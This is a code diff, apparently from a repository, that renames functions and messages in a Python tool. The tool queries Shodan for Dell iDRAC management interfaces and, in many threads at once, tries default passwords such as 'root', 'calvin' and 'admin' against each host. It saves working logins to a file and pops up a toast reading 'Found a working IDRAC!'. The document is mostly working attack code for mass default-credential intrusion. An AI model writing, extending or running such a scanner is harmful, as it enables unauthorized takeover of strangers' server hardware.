@@ -8,7 +8,7 @@ SHODAN_API_KEY = 'key6463653636'
 shodan_client = shodan.Shodan(SHODAN_API_KEY)
 
 att = set() 
-def railmedaddyngh(ip):
+def thinger1(ip):
     passwords = ["root", "calvin", "server", "dell", "admin", "password", "test", "hotel", "guest"]
     
     if ip in att: 
@@ -45,7 +45,7 @@ def railmedaddyngh(ip):
                 auth_result = response.headers.get('authResult')
                 if auth_result:
                     print(f"[+] {ip}, password: {password}, authresult: {auth_result}")
-                    toaster = WindowsToaster('DellRailer :3')
+                    toaster = WindowsToaster('dellthing')
                     newToast = Toast()
                     newToast.text_fields = [f'Found a working IDRAC! Check the TXT file in your directory. ({ip})']
                     toaster.show_toast(newToast)
@@ -54,7 +54,7 @@ def railmedaddyngh(ip):
                         f.write(f'[+] {ip}, password: {password}, authresult: {auth_result}\n')
                 else:
                     print(f'[+] {ip}, password: {password}, authresult: NONE')
-                    toaster = WindowsToaster('DellRailer :3')
+                    toaster = WindowsToaster('dellthing')
                     newToast = Toast()
                     newToast.text_fields = [f'Found a working IDRAC! Check the TXT file in your directory.']
                     toaster.show_toast(newToast)
@@ -104,7 +104,7 @@ def gofetch(query, pages):
 def worker(ips):
     threads = []
     for ip in ips:
-        thread = threading.Thread(target=railmedaddyngh, args=(ip,))
+        thread = threading.Thread(target=thinger1, args=(ip,))
         threads.append(thread)
         thread.start()
     
@@ -118,7 +118,7 @@ def main():
     ips = gofetch(query, pages=rezult)
     print(f"{len(ips)} ips found.")
     worker(ips)
-    print("Im finished k-king!~")
+    print("done")
 
 if __name__ == '__main__':
     main()
